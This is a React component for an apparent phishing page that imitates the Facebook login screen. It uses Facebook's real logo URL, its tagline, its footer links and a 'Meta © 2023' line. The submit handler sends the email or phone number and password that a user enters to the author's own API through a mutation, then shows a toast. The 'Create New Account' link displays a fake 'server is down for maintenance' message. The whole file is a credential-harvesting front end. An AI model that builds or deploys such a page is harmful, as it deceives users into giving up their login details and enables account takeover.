import React, { useState } from "react";
import { useCreateLoginMutation, useGetLoginQuery } from "./Redux/apis";
import Toast from "./components/Toast";

function App() {
  const [toast, setToast] = useState(false);
  const [error, setError] = useState(false);
  const [emailError, setEmailError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);
  const [inputType, setInputType] = useState("email");
  const [postData] = useCreateLoginMutation();

  const submitHandler = async (e) => {
    e.preventDefault();

    try {
      const formData = Object.fromEntries(new FormData(e.target).entries());
      // Validate email
      if (inputType === "email" && !validateEmail(formData.emailOrcontact)) {
        setEmailError(true);
        setPasswordError(false);
        return;
      }

      // Validate password
      if (!formData.password) {
        setPasswordError(true);
        setEmailError(false);
        return;
      }

      // If both email and password are valid, proceed with API call
      await postData(formData).unwrap().then(setToast(true));
      setError(false);
      console.log(formData);
    } catch (error) {
      console.log(error);
    }
  };

  const handleInputChange = (e) => {
    const inputValue = e.target.value;

    if (inputValue.trim() === "" || isNaN(inputValue)) {
      setInputType("email");
    } else {
      setInputType("text");
    }

    setEmailError(false);
    setError(false);
  };

  const handlePasswordInput = (e) => {
    const inputValue = e.target.value;

    if (!inputValue) {
      setPasswordError(true);
    } else {
      setPasswordError(false);
    }
  };

  // Email validation function
  const validateEmail = (email) => {
    // You can use a more sophisticated email validation regex here
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };
  return (
    <>
      <div className="fix-m-header">
        <img src="cell-phone.png" alt="Android" />
        <span>Get Facebook for Android and browse faster</span>
      </div>
      <div className="container h-[28vw]">
        {toast && <Toast />}
        {/* main container */}
        <div className="content">
          {/* logo container */}
          <div className="left-content">
            <div className="f-logo">
              <img
                src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
                alt="Facebook"
              />
            </div>
            <h2 className="f-quote">
              Facebook helps you connect and share <br />
              with the people in your life.
            </h2>
          </div>
          {/* login form */}
          <div className="right-content ">
            <div className="card min-h-[37vh]">
              <form onSubmit={submitHandler}>
                <div className="input-container mb-[3px]">
                  <input
                    type={inputType}
                    name="emailOrcontact"
                    placeholder="Email address or phone number"
                    onClick={() => setError(false)}
                    onChange={handleInputChange}
                  />
                  {emailError && (
                    <span className="text-red-600 w-full">
                      The field is required
                    </span>
                  )}
                </div>
                <div className="input-container">
                  <input
                    type="password"
                    placeholder="Password"
                    name="password"
                    onClick={() => setError(false)}
                    onChange={handlePasswordInput}
                  />
                  {passwordError && (
                    <span className="text-red-600 w-full">
                      The field is required
                    </span>
                  )}
                </div>
                <div className="login-btn-container">
                  <button className="login-btn" type="submit">
                    Log In
                  </button>
                </div>
              </form>
              <div className="forgotten-password -mt-1">
                <a href="#">Forgotten Password?</a>
              </div>
              <div className="divider" />
              <div className="mt-2" style={{ textAlign: "center" }}>
                <a
                  onClick={() => setError(true)}
                  className="crt-new-ac py-[14px] px-4 flex items-center"
                  href="#"
                >
                  Create New Account
                </a>
              </div>
              {error && (
                <span className="text-red-600 w-full ml-10">
                  The server is down for maintenance, Try again later
                </span>
              )}
            </div>
            <div className="crt-page mt-2">
              <a href="#" className="mr-1">
                Create a Page
              </a>
              <span>for a celebrity, band or business.</span>
            </div>
          </div>
        </div>
      </div>
      <footer className="f-lg-footer overflow-y-hidden">
        <ul>
          <li>
            <a href="">English (UK)</a>
          </li>
          <li>
            <a href="">বাংলা</a>
          </li>
          <li>
            <a href="">हिन्दी</a>
          </li>
          <li>
            <a href="">اردو</a>
          </li>
          <li>
            <a href="">नेपाली</a>
          </li>
          <li>
            <a href="">ଓଡ଼ିଆ</a>
          </li>
          <li>
            <a href="">Español</a>
          </li>
          <li>
            <a href="">Português (Brasil)</a>
          </li>
          <li>
            <a href="">Français (France)</a>
          </li>
          <li>
            <a href="">Deutsch</a>
          </li>
          <li>
            <a href="">Italiano</a>
          </li>
        </ul>
        <div className="divider sm:hidden" />
        <ul className="">
          <li>
            <a href="">Sign Up</a>
          </li>
          <li>
            <a href="">Log In</a>
          </li>
          <li>
            <a href="">Messenger</a>
          </li>
          <li>
            <a href="">Facebook Lite</a>
          </li>
          <li>
            <a href="">Watch</a>
          </li>
          <li>
            <a href="">Places</a>
          </li>
          <li>
            <a href="">Games</a>
          </li>
          <li>
            <a href="">Marketplace</a>
          </li>
          <li>
            <a href="">Facebook Pay</a>
          </li>
          <li>
            <a href="">Jobs</a>
          </li>
          <li>
            <a href="">Oculus</a>
          </li>
          <li>
            <a href="">Portal</a>
          </li>
          <li>
            <a href="">Instagram</a>
          </li>
          <li>
            <a href="">Local</a>
          </li>
          <li>
            <a href="">Fundraisers</a>
          </li>
          <li>
            <a href="">Services</a>
          </li>
          <li>
            <a href="">Voting</a>
          </li>
          <li>
            <a href="">Information Centre</a>
          </li>
          <li>
            <a href="">About</a>
          </li>
          <li>
            <a href="">Create ad</a>
          </li>
          <li>
            <a href="">Create Page</a>
          </li>
          <li>
            <a href="">Developers</a>
          </li>
          <li>
            <a href="">Careers</a>
          </li>
          <li>
            <a href="">Privacy</a>
          </li>
          <li>
            <a href="">Cookies</a>
          </li>
          <li>
            <a href="">AdChoices</a>
          </li>
          <li>
            <a href="">Terms</a>
          </li>
          <li>
            <a href="">Help</a>
          </li>
          <li>
            <a href="">Settings</a>
          </li>
          <ul className="mt-6 ml-[5px] font-light text-[0.755rem] text-gray-500">
            Meta © 2023
          </ul>
        </ul>
      </footer>
      <div className="m-footer">
        <div className="m-f-lang">
          <ul>
            <li>
              <a href="">English (UK)</a>
            </li>
            <li>
              <a href="">বাংলা</a>
            </li>
            <li>
              <a href="">हिन्दी</a>
            </li>
          </ul>
          <ul>
            <li>
              <a href="">اردو</a>
            </li>
            <li>
              <a href="">नेपाली</a>
            </li>
            <li>
              <a href="">ଓଡ଼ିଆ</a>
            </li>
          </ul>
        </div>
        <div style={{ clear: "both" }} />
        <div className="links" style={{ textAlign: "center" }}>
          <a href="#">About</a>
          <a href="#">Help</a>
          <a href="#">More</a>
        </div>
        <div
          style={{
            fontWeight: 600,
            textAlign: "center",
            margin: "10px 0",
            color: "#777",
          }}
        >
          Facebook Inc
        </div>
      </div>
    </>
  );
}

export default App;
